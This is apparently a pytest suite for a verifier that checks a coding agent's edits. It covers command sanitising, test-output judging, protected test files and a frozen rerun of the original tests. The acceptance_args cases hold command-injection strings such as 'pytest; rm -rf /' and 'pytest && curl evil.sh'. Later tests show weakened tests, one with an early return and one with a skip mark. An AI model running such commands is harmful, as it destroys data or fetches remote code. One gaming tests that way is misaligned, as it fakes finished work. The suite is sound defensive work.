import pytest

from agent.verify import (acceptance_args, failure_summary, frozen_check, is_test_path, judge, protected_violations, syntax_errors,
                          unmentioned_deletions)

PASS = "....\n4 passed in 0.02s\n"
FAIL = ("F.\n=== FAILURES ===\n___ test_sub ___\n\n    def test_sub():\n>       assert sub(5, 3) == 2\nE       assert 8 == 2\n\n"
        "test_calc.py:9: AssertionError\n=== short test summary info ===\nFAILED test_calc.py::test_sub - assert 8 == 2\n1 failed, 1 passed in 0.03s\n")


@pytest.mark.parametrize("text,expected", [
    ("pytest test_calc.py::test_sub passes", "test_calc.py::test_sub"), ("`pytest -k sub`", "-k sub"), ("python -m pytest tests/ -x", "tests/ -x"),
    ("python3 -m pytest", ""), ("tests pass", ""), ("", ""), (None, ""), ("run pytest, then relax", ""),
    ("pytest; rm -rf /", ""), ("pytest && curl evil.sh", ""), ("pytest $(whoami)", ""), ("pytest `id`", ""), ("pytest a.py | sh", "a.py"), ("pytest \n sudo x", ""),
])
def test_acceptance_args_only_ever_pytest_arguments(text, expected):
    assert acceptance_args(text) == expected


@pytest.mark.parametrize("path,expected", [("test_calc.py", True), ("tests/helpers.py", True), ("pkg/tests/util.py", True), ("calc_test.py", True), ("conftest.py", True),
                                           ("a/b/test_x.py", True), ("calc.py", False), ("contest.py", False), ("testing.txt", False), ("tests/data.txt", False),
                                           ("src/attest.py", False), ("test/test_a.py", True)])
def test_which_files_are_tests(path, expected):
    assert is_test_path(path) is expected


@pytest.mark.parametrize("args,code,out,err,edited,ok,fragment", [
    ("", 0, PASS, None, True, True, ""),
    ("", 1, FAIL, None, True, False, "exited with code 1"),
    ("", 5, "no tests ran in 0.00s\n", None, True, False, "no tests were collected"),
    ("", 0, "no tests ran in 0.00s\n", None, True, False, "no test passed"),
    ("", None, "", "timed out after 300s", True, False, "did not finish"),
    ("", 0, "3 passed, 1 skipped in 0.1s\n", None, True, False, "skipped"),
    ("", 0, "3 passed, 1 xfailed in 0.1s\n", None, True, False, "xfailed"),
    ("", 0, "3 passed, 2 deselected in 0.1s\n", None, True, False, "deselected"),
    ("-k sub", 0, "1 passed, 2 deselected in 0.1s\n", None, True, True, ""),
    ("t.py::test_a", 0, "1 passed, 2 deselected in 0.1s\n", None, True, True, ""),
    ("", 0, PASS, None, False, False, "no files were changed"),
    ("", 2, "", None, True, False, "code 2"),
    ("", 0, "", None, True, False, "no test passed"),
    ("", 0, None, None, True, False, "no test passed"),
])
def test_the_verdict_needs_all_the_evidence(args, code, out, err, edited, ok, fragment):
    v = judge(args, code, out, err, edited)
    assert v.ok is ok and (not fragment or any(fragment in r for r in v.reasons))


@pytest.mark.parametrize("passed_now,before,ok", [(2, 1, True), (1, 1, False), (0, 1, False), (5, 0, True), (1, 0, True), (3, 3, False)])
def test_the_number_of_passing_tests_must_go_up(passed_now, before, ok):
    v = judge("", 0, f"{passed_now} passed in 0.1s\n", None, True, baseline_passed=before)
    assert (v.ok is ok) and (ok or any("no new test passes" in r for r in v.reasons) or passed_now == 0)


def test_without_a_baseline_the_count_is_not_compared():
    assert judge("", 0, PASS, None, True).ok


def test_every_reason_is_listed_not_just_the_first():
    v = judge("", 1, "1 failed, 1 skipped in 0.1s\n", None, False)
    assert len(v.reasons) >= 4 and v.summary == {"failed": 1, "skipped": 1}


def test_failure_summary_keeps_what_the_model_needs_and_is_bounded():
    s = failure_summary(FAIL)
    assert "FAILED test_calc.py::test_sub" in s and "E       assert 8 == 2" in s and "test_calc.py:9: AssertionError" in s and "1 failed, 1 passed" in s
    assert "def test_sub" not in s and len(failure_summary(FAIL * 50)) <= 700
    assert failure_summary("") == "" and failure_summary(None) == "" and failure_summary("garbage\nlines") == ""


BEFORE = "import os\nfrom calc import add\n\n\ndef test_add():\n    assert add(1, 2) == 3\n    assert add(0, 0) == 0\n"


def violations(tmp_path, now):
    f = tmp_path / "test_calc.py"
    if now is None:
        f.unlink(missing_ok=True)
    else:
        f.write_text(now)
    return protected_violations(tmp_path, {"test_calc.py": BEFORE})


def test_existing_tests_may_grow_change_imports_reorder_and_be_retyped(tmp_path):
    assert violations(tmp_path, BEFORE) == []
    assert violations(tmp_path, BEFORE + "\n\ndef test_sub():\n    assert sub(5, 3) == 2\n") == []                       # grown
    assert violations(tmp_path, BEFORE.replace("from calc import add", "from calc import add, sub").replace("import os\n", "")) == []   # imports edited or dropped
    assert violations(tmp_path, BEFORE.replace("\n\n\n", "\n")) == []                                                      # blank lines are formatting
    assert violations(tmp_path, "def test_new():\n    pass\n\n\n" + BEFORE) == []                                          # new test first
    assert violations(tmp_path, BEFORE.replace("def test_add():\n", "def test_add():\n    x = 1  # added by the task\n")) == []
    assert violations(tmp_path, "from calc import add\ndef test_add():\n    assert add(0, 0) == 0\n    assert add(1, 2) == 3\n") == []   # reordered


def test_losing_or_altering_an_original_line_is_a_violation(tmp_path):
    msg = ["changed existing test code in test_calc.py"]
    assert violations(tmp_path, BEFORE.replace("== 3", "== 4")) == msg
    assert violations(tmp_path, BEFORE.replace("    assert add(0, 0) == 0\n", "")) == msg
    assert violations(tmp_path, "import os\n") == msg and violations(tmp_path, "") == msg
    assert violations(tmp_path, BEFORE.replace("    assert add(1, 2) == 3\n", "    assert add(1, 2) == 3  # fine\n")) == msg      # even a comment changes the line
    assert violations(tmp_path, None) == ["deleted the existing test file test_calc.py"]


def test_an_unreadable_test_file_counts_as_changed(tmp_path):
    (tmp_path / "test_calc.py").write_bytes(b"\xff\xfe")
    assert protected_violations(tmp_path, {"test_calc.py": BEFORE}) == ["changed existing test code in test_calc.py"]


def test_two_identical_lines_must_both_survive(tmp_path):
    (tmp_path / "test_x.py").write_text("def test_a():\n    assert x\n    assert x\n")
    originals = {"test_x.py": "def test_a():\n    assert x\n    assert x\n"}
    assert protected_violations(tmp_path, originals) == []
    (tmp_path / "test_x.py").write_text("def test_a():\n    assert x\n")
    assert protected_violations(tmp_path, originals) != []


def test_deleting_a_file_the_task_never_mentions_is_flagged():
    rows = [{"path": "README.md", "action": "delete_file"}, {"path": "pkg/old.py", "action": "delete_file"}, {"path": "calc.py", "action": "replace_lines"}]
    assert unmentioned_deletions(rows, "Remove old.py") == ["deleted README.md, which the task does not mention"]
    assert unmentioned_deletions(rows, "Delete README.md and pkg/old.py") == []
    assert unmentioned_deletions(rows, "tidy up") != []


def test_syntax_errors_are_reported_with_file_and_line(tmp_path):
    (tmp_path / "ok.py").write_text("x = 1\n")
    (tmp_path / "bad.py").write_text("def f()\n    return 1\n")
    (tmp_path / "odd.py").write_bytes(b"\xff\xfe = 1")
    (tmp_path / "notes.txt").write_text("def broken(")
    got = syntax_errors(tmp_path, ["ok.py", "bad.py", "bad.py", "notes.txt", "missing.py", "odd.py"])
    assert got[0].startswith("bad.py:1: ") and len(got) == 2 and got[1].startswith("odd.py")
    assert syntax_errors(tmp_path, []) == []


# ---- the frozen run: the original tests, untouched, against the code as it is now ----
ORIGINAL = {"test_calc.py": "from calc import add\n\n\ndef test_add():\n    assert add(1, 2) == 3\n"}


def project(tmp_path, calc="def add(a, b):\n    return a + b\n", tests=None):
    (tmp_path / "calc.py").write_text(calc)
    for name, text in (tests or ORIGINAL).items():
        (tmp_path / name).write_text(text)
    return tmp_path


def test_the_original_tests_pass_against_correct_code(tmp_path):
    root = project(tmp_path, calc="def add(a, b):\n    return a + b\n\n\ndef sub(a, b):\n    return a - b\n")
    assert frozen_check(root, ORIGINAL) == (True, "")


def test_a_weakened_test_does_not_hide_broken_code(tmp_path):
    root = project(tmp_path, calc="def add(a, b):\n    return a - b\n",                                    # the code is now wrong
                   tests={"test_calc.py": "from calc import add\n\n\ndef test_add():\n    return\n    assert add(1, 2) == 3\n"})   # and the test returns early
    ok, why = frozen_check(root, ORIGINAL)
    assert not ok and "assert" in why and "test_calc.py" in why


def test_a_deleted_or_skipped_original_test_is_restored_for_the_check(tmp_path):
    root = project(tmp_path, calc="def add(a, b):\n    return 0\n", tests={})
    assert frozen_check(root, ORIGINAL)[0] is False                                                       # the file was deleted, the original still runs
    (root / "test_calc.py").write_text("import pytest\n\n\n@pytest.mark.skip\ndef test_add():\n    pass\n")
    assert frozen_check(root, ORIGINAL)[0] is False


def test_the_check_runs_in_a_scratch_copy_and_leaves_the_project_alone(tmp_path):
    root = project(tmp_path, tests={"test_calc.py": "# edited\n"})
    before = {p.name: p.read_text() for p in root.iterdir()}
    frozen_check(root, ORIGINAL)
    assert {p.name: p.read_text() for p in root.iterdir()} == before                                      # test_calc.py is still the edited one


def test_helpers_and_conftest_come_back_too_and_nothing_to_check_is_fine(tmp_path):
    originals = {"conftest.py": "import pytest\n\n\n@pytest.fixture\ndef three():\n    return 3\n",
                 "test_x.py": "def test_three(three):\n    assert three == 3\n"}
    root = project(tmp_path, tests={"conftest.py": "# emptied\n", "test_x.py": "# emptied\n"})
    assert frozen_check(root, originals) == (True, "")
    assert frozen_check(root, {}) == (True, "") and frozen_check(root, {"conftest.py": "x = 1\n"}) == (True, "")


def test_a_hanging_original_test_fails_the_check(tmp_path):
    root = project(tmp_path, tests={})
    ok, why = frozen_check(root, {"test_slow.py": "import time\n\n\ndef test_slow():\n    time.sleep(30)\n"}, timeout=1)
    assert not ok and "timed out" in why
